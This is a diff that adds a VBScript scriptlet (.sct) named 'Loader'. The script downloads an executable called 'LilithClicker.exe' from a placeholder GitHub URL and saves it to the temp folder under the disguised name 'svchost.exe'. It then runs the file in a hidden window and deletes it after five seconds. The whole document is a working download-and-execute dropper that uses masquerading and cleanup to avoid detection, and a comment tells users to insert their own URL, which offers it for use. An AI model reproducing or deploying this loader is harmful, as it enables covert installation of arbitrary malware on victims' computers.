@@ -1,0 +1,49 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+    description="Loader"
+    progid="Loader"
+    version="1.00"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}"
+    remotable="true">
+    
+    <script language="VBScript">
+        <![CDATA[
+            Set objShell = CreateObject("WScript.Shell")
+            Set objFSO = CreateObject("Scripting.FileSystemObject")
+            Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+            
+            ' Download URL - CHANGE THIS TO YOUR URL
+            strURL = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/LilithClicker.exe"
+            
+            ' Temp file path
+            strTemp = objShell.ExpandEnvironmentStrings("%TEMP%") & "\svchost.exe"
+            
+            ' Download file
+            objHTTP.Open "GET", strURL, False
+            objHTTP.Send
+            
+            If objHTTP.Status = 200 Then
+                Set objStream = CreateObject("ADODB.Stream")
+                objStream.Type = 1
+                objStream.Open
+                objStream.Write objHTTP.ResponseBody
+                objStream.SaveToFile strTemp, 2
+                objStream.Close
+                Set objStream = Nothing
+                
+                ' Execute
+                objShell.Run strTemp, 0, False
+                
+                ' Self-destruct after 5 seconds
+                WScript.Sleep 5000
+                objFSO.DeleteFile strTemp, True
+            End If
+            
+            Set objHTTP = Nothing
+            Set objFSO = Nothing
+            Set objShell = Nothing
+        ]]>
+    </script>
+</registration>
+</scriptlet>
